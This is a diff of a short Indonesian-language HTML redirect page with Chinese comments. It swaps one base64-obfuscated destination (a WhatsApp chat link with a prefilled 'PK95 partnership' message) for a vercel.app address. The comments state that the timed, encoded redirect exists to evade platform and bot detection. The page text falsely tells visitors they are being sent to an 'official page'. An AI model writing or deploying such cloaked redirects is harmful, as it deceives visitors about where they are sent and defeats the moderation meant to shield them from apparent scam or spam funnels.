@@ -2,22 +2,19 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Memuat...</title>
+  <title>Memuat Halaman...</title>
   <meta name="robots" content="noindex, nofollow">
   <script>
-    // Base64 加密后的 WhatsApp 跳转链接（含消息）
-    const encoded = "aHR0cHM6Ly9hcGkud2hhdHNhcHAuY29tL3NlbmQ/cGhvbmU9ODU1OTYyNDM3NzY0JnRleHQ9U2F5YSB0ZXJ0YXJpayB1bnR1ayBrZW1pdHJhYW4gUEs5NQ==";
+    // 用 base64 编码的第二页链接（真实跳转页）
+    const encoded = "aHR0cHM6Ly93c3MtYW1iZXIudmVyY2VsLmFwcC8=";  // 对 https://wss-amber.vercel.app/ 进行 base64 加密
 
-    // 延迟跳转，规避平台识别
+    // 延迟跳转（防止机器人立即识别）
     setTimeout(() => {
       window.location.href = atob(encoded);
-    }, 800);
+    }, 1000); // 可根据需要设为800~1500ms
   </script>
 </head>
 <body>
-  <p>Sedang mengarahkan ke halaman resmi...</p>
+  <p>Sedang memuat, mohon tunggu...</p>
 </body>
 </html>
-
-
-
